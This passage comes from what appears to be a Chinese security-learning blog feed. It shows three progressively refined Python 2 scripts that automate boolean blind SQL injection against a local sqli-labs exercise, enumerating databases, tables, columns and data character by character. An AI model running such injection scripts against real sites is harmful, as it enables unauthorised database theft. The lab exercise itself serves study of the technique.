class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line">    # print url1</span><br><span class="line">    # print url2</span><br><span class="line">    # return 1</span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def chahangshu():</span><br><span class="line">#</span><br><span class="line"># def changzifushu():</span><br><span class="line">#</span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        list = []</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1)</span><br><span class="line">                    print qingqiuURLm2</span><br><span class="line">                    list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    print qingqiuURL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema = &quot;select schema_name from information_schema.schemata&quot;</span><br><span class="line">    # hangshu = chahangshu()</span><br><span class="line">    # zifushu = changzifushu()</span><br><span class="line">    hangshu = 4</span><br><span class="line">    zifushu = [18,18,18,18]</span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br><span class="line">可以看到5行数据已经爆出来了（后期脚本有改动）</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入11.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>接下来完善布尔查询行数和每行查询字符数的功能（这让手工也忒累了吧！）<br>下面的脚本可以跑出数据库的数量，每个数据库的字符长度和数据库名。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入12.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line">    # print url1</span><br><span class="line">    # print url2</span><br><span class="line">    # return 1</span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    # print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br><span class="line"></span><br><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;个数据库字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line">            # print url3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        list = []</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    # print qingqiuURLm2</span><br><span class="line">                    list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    print qingqiuURL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    # hangshu = 5</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>查库的数据AND查表的数据AND查字段的数据，根本上都是进行了三部，首先查行数，再查每行字符数，最后查每行的单个数据。所以接下来查表名的脚本几乎差不多，只是将核心查询语句改了罢了！代码运行如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入13.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入14.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入17.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入15.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入16.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line"></span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    print &quot;1111111&quot;</span><br><span class="line">    print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br><span class="line"></span><br><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line">            # print url3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        flag = &quot;&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    # print qingqiuURLm2</span><br><span class="line">                    flag+= chr(m+1)</span><br><span class="line">                    # list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line">                    print flag</span><br><span class="line"></span><br><span class="line">        list.append(flag)</span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    # # hangshu = 5</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line">    # print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    # print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chatable_name(url,schema_name):</span><br><span class="line">    url_table1 = &quot;select&quot;</span><br><span class="line">    url_table2 = &quot;table_name&quot;</span><br><span class="line">    url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name)</span><br><span class="line">    url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3</span><br><span class="line">    hangshu = chahangshu(url, url_table1, url_table2, url_table3)</span><br><span class="line">    print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_table, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_table, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chacolumn_name(url,schema_name,table_name):</span><br><span class="line">    url_column1 = &quot;select&quot;</span><br><span class="line">    url_column2 = &quot;column_name&quot;</span><br><span class="line">    url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name)</span><br><span class="line">    url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_column1, url_column2, url_column3)</span><br><span class="line">    print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_column, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_column, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def cha_shuju(url, schema_name,table_name,column_name):</span><br><span class="line">    url_shuzhi1 = &quot;select&quot;</span><br><span class="line">    url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name)</span><br><span class="line">    url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name)</span><br><span class="line"></span><br><span class="line">    url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3)</span><br><span class="line">    print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_shuzhi, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line">    print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name)</span><br><span class="line">    zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;)</span><br><span class="line">    # zhiding_schema = &apos;security&apos;</span><br><span class="line">    # schema_name = [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;]</span><br><span class="line">    i =1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in schema_name:</span><br><span class="line">            print i,zhiding_schema</span><br><span class="line">            if zhiding_schema == i:</span><br><span class="line">                table_name = chatable_name(url, zhiding_schema)</span><br><span class="line">                print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name)</span><br><span class="line">                i =0</span><br><span class="line">                break</span><br><span class="line">        if(i ==1):</span><br><span class="line">            zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_table = raw_input(&quot;请输入要查询的表名&quot;)</span><br><span class="line">    # # print zhiding_table</span><br><span class="line">    # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in table_name:</span><br><span class="line">            print i, zhiding_table</span><br><span class="line">            if zhiding_table == i:</span><br><span class="line">                columns_name = chacolumn_name(url, zhiding_schema,zhiding_table)</span><br><span class="line">                i = 0</span><br><span class="line">                print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name)</span><br><span class="line">                break</span><br><span class="line">        if(i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_column = raw_input(&quot;请输入要查询的字段&quot;)</span><br><span class="line">    # # print zhiding_column</span><br><span class="line">    # columns_name = [&apos;id&apos;, &apos;email_id&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in columns_name:</span><br><span class="line">            print i, zhiding_column</span><br><span class="line">            if zhiding_column == i:</span><br><span class="line">                shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column)</span><br><span class="line">                print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name)</span><br><span class="line">                i = 0</span><br><span class="line">                break</span><br><span class="line">        if (i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习sql盲注的过程&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python脚本之报错注入函数检测</title>
    <link href="https://0xxk.github.io/2019/09/07/python%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E6%A3%80%E6%B5%8B/"/>
    <id>https://0xxk.github.io/2019/09/07/python脚本之报错注入函数检测/</id>
    <published>2019-09-07T14:26:08.724Z</published>
    <updated>2019-09-07T15:36:48.613Z</updated>
    
